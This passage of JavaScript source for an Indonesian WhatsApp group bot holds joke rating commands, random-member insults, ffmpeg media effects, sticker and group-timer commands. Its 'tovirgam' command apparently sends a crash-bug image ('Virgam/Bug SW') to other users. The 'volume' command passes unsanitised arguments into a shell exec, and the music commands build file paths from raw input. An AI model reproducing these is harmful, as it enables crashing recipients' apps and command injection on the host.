if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
apakah = body.slice(1)
const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
const kah = apa[Math.floor(Math.random() * apa.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
break
					
case 'bagaimanakah':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
bagaimanakah = body.slice(1)
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
break
					
case 'rate':
rate = body.slice(1)
const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const te = ra[Math.floor(Math.random() * ra.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
break
					
case 'sangecek':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
sange = body.slice(1)
const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const nge = sang[Math.floor(Math.random() * sang.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
break
					
case 'gaycek':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
gayy = body.slice(1)
const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yag = gay[Math.floor(Math.random() * gay.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
break
					
case 'lesbicek':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
lesbii = body.slice(1)
const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
break
					
case 'gantengcek':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
ganteng = body.slice(1)
const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
break
					
case 'cantikcek':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
cantik = body.slice(1)
const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const tik = can[Math.floor(Math.random() * can.length)]
xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
break

case 'babi':
 if(!isGroup) return setReply("Hanya bisa di group")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
membr = []
const meg = groupMembers
const mge = groupMembers
const ba = meg[Math.floor(Math.random() * meg.length)]
const bua = pushname[Math.floor(Math.random() * mge.length)]
teks = `Yang Paling Babi Disini Adalah : @${ba.jid.split('@')[0]}`
membr.push(ba.jid)
mentions(teks, membr, true)
break

case 'beban':
if(!isGroup) return setReply("Hanya bisa di group")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
membr = []
const ngewe = groupMembers
              
const beb = ngewe[Math.floor(Math.random() * ngewe.length)]
              
teks = `Yang Paling Beban Disini Adalah : @${beb.jid.split('@')[0]}`
membr.push(beb.jid)
mentions(teks, membr, true)
break

case 'wibu':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (!isGroup) return reply(mess.only.group)
membr = []
const baa = groupMembers
const bb = groupMembers
const bc = baa[Math.floor(Math.random() * baa.length)]
const bd = bb[Math.floor(Math.random() * bb.length)]
teks = `*Yang Paling Wibu Disini Adalah :* @${bc.jid.split('@')[0]}`
membr.push(bc.jid)
mentions(teks, membr, true)
break
case 'terganteng':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (!isGroup) return reply(mess.only.group)
membr = []
const ca = groupMembers
const cb = groupMembers
const cc = ca[Math.floor(Math.random() * ca.length)]
const cd = cb[Math.floor(Math.random() * cb.length)]
teks = `*Yang Paling Terganteng Disini Adalah :* @${cc.jid.split('@')[0]}`
membr.push(cc.jid)
mentions(teks, membr, true)
break
case 'tercantik':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (!isGroup) return reply(mess.only.group)
membr = []
const da = groupMembers
const db = groupMembers
const dc = da[Math.floor(Math.random() * da.length)]
const dd = db[Math.floor(Math.random() * db.length)]
teks = `*Yang Paling Tercantik Disini Adalah :* @${dc.jid.split('@')[0]}`
membr.push(dc.jid)
mentions(teks, membr, true)
break

case 'goblok':
case 'pinter':
case 'baik':
case 'jahat':
case 'pakboy':
case 'pakgirl': 
case 'sadboy':
case 'sadgirl':  
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (!isGroup) return reply(`GROUP ONLY`)
jds = []
const A1 = groupMembers
const B1 = groupMembers
const C1 = A1[Math.floor(Math.random() * A1.length)]
D1 = `*Yang Ter${command} Disini Adalah* @${C1.jid.split('@')[0]}`                  
jds.push(C1.jid)
mentions(D1, jds, true)
break
           
           
           
           
           
           
           
           
           
           
           
           
       case 'tovirgam':
       case 'jadivirgam':
        if (!isOwner) return onlyOwner()
					if (!isQuotedSticker) return setReply('Reply stiker nya')
					if (isQuotedSticker){
						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return setReply(mess.error.api)
							buffer = fs.readFileSync(ran)
							xdev.sendMessage(from, buffer, image, {quoted: dev, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
           
           
           

						
						
						

						
						
						
						
case 'tts':
try{
if (args.length < 1) return setReply('Kode bahasanya mana kak ?\nKirim perintah *.kodebahasa* untuk melihat kode')
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if (args.length < 2) return setReply('Textnya mana kak?')
gtts = require('./lib/gtts')(args[0])
dtt = q
ranm = getRandom('.mp3')
if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
gtts.save(ranm, dtt, function() {
xdev.sendMessage(from, fs.readFileSync(ranm), audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: true,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {surface : 2,message: `🆔${pushname}`, sellerJid: '0@s.whatsapp.net', contextInfo: forward}}},})
fs.unlinkSync(ranm)
})  
 } catch (err){
console.log(err)
console.log(color("Auto turn to id of tts"))
gtts = require('./lib/gtts')("id")
dtt = q
ranm = getRandom('.mp3')
if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
gtts.save(ranm, dtt, function() {
xdev.sendMessage(from, fs.readFileSync(ranm), audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: true,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {surface : 2,message: `🆔${pushname}`, sellerJid: '0@s.whatsapp.net', contextInfo: forward}}},})
fs.unlinkSync(ranm)
})
}
break
					
		
			 
					
					
					
case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (!isQuotedAudio) return setReply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await xdev.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return setReply('Error!')
jadie = fs.readFileSync(rname)
xdev.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: setQuoted})
fs.unlinkSync(rname)
}
)
break
					
					
                 
                 
                 
           

           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Close time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
					setReply(close)
				}, timer)
				break
				
				
case 'opentime':        
			if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
               if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Open time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
					setReply(open)
				}, timer)
				break
				
				
				
        
                
                

       
            

           
           
           
           
           


           
           

           
           

           
           
           
           
           
           
           
           
           
           
           

            
            

    
    
    
    
    
    
    

            


    

				
				
    
     




case 'darkjokes':
setReply(mess.wait)
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					await xdev.sendMessage(from, hasil, image, {quoted: setQuoted, caption: '*Done Kak!!*'})
					} catch (err){
						setReply(err)
						}
						limitAdd(senderNumber, user)
				break

    
    
    case 'on': 
             if (!isOwner) return onlyOwner()
            offline = false
            setReply(' ANDA TELAH ONLINE')
            break       
    case 'statuson':
            setReply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!isOwner) return onlyOwner()
            if(!q) return reply ("Alasanya apa kak ?")
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            setReply(`Anda telah offline dengan alasan ${q}`)
            break   
 
					
					
					
					



			       
		     





                    
                


     






    
            
    case 'tomp3':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
    case 'fast':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':  
            if (!isQuotedVideo) return setReply('Reply videonya!')
            setReply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
            
            case 'hode':
  if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medok)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt: true, quoted: dev})
						fs.unlinkSync(ran)
					})
				break
            
            case 'ghost':
if(!isQuotedAudio) return setReply('Reply audionya')
            setReply(mess.wait)
					encmedia2 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mele = await xdev.downloadAndSaveMediaMessage(encmedia2)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(mele)
					if (err) return setReply('Error!')
					buffer453 = fs.readFileSync(ran)
					xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
                    fs.unlinkSync(ran)
				    })
		            break



case 'nightcore':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
					encmedia4 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					mela = await xdev.downloadAndSaveMediaMessage(encmedia4)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mela)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					   })
				       break



case 'tupai':
if(!isQuotedAudio) return setReply('Reply audionya')
				setReply(mess.wait)
					mesi = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
					medoi = await xdev.downloadAndSaveMediaMessage(mesi)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medoi)
						if (err) return setReply('Error!')
						buffer453 = fs.readFileSync(ran)
						xdev.sendMessage(from, buffer453, audio, {mimetype: 'audio/mp4', ptt:true, quoted : dev})
						fs.unlinkSync(ran)
					})
				break





case 'imut':
if(!isQuotedAudio) return setReply('Reply audionya')
setReply(mess.wait)
	 ahu = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
	masa = await xdev.downloadAndSaveMediaMessage(ahu)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: "audio/mp4", ptt: true, quoted: dev})
fs.unlinkSync(ran)})
break


        
        
    case 'reverse':
            if (!isQuotedVideo) return setReply('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return setReply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    



case 'style':
				  if(!q) return setReply('Masukkan teks!')
         setReply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
break
case 'pastebin':
if(!q) return setReply(`Contoh ${prefix}pastebin Extream`)
yamete = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   xdev.sendMessage(from, `${yamete.result}`, text, {quoted: setQuoted})
                     break
                     
     


                
    case 'anime':
    if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'*Done Kak!!*'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
            
    
            

            
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return setReply(`*Reply Stickernya .take Gua|Anak Dakjal*`)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ahuh = args.join(' ').split('|')
            satu = ahuh[0] !== '' ? ahuh[0] : `SadBoy`
            dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
			
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await xdev.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await xdev.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            setReply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    

				
				     
				
				
				
				
				
				
				

				
				
				
				case 'addmusik':
				{
				
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return setReply('Reply musik')
				if (!q) return setReply('Nama musiknya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				musiknye.push(q)
				fs.writeFileSync(`./temp/musik/${q}.mp3`, delb)
				fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
				await xdev.sendMessage(from, `Sukses Menambahkan musik\nCek dengan cara ${prefix}musik`, MessageType.text, { quoted: dev})
				}
				break
				
				
				
				
				case 'delmusik':
					if (!isOwner) return onlyOwner() 
					try {
				await setReply(mess.wait)
					 wanu = audionye.indexOf(q)
					 musiknye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/musik/${q}.mp3`)
					fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
					await xdev.sendMessage(from, `Sukses menghapus musik ${q}`, text)
					} catch (err){
						console.log(err)
						setReply('eror kak')
					}
					break
				
				
				
				
				
				case 'delvn':
					if (!isOwner) return onlyOwner() 
					try {
					 wanu = audionye.indexOf(q)
					 audionye.splice(wanu, 1)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				    fs.unlinkSync(`./temp/audio/${q}.mp3`)
					xdev.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
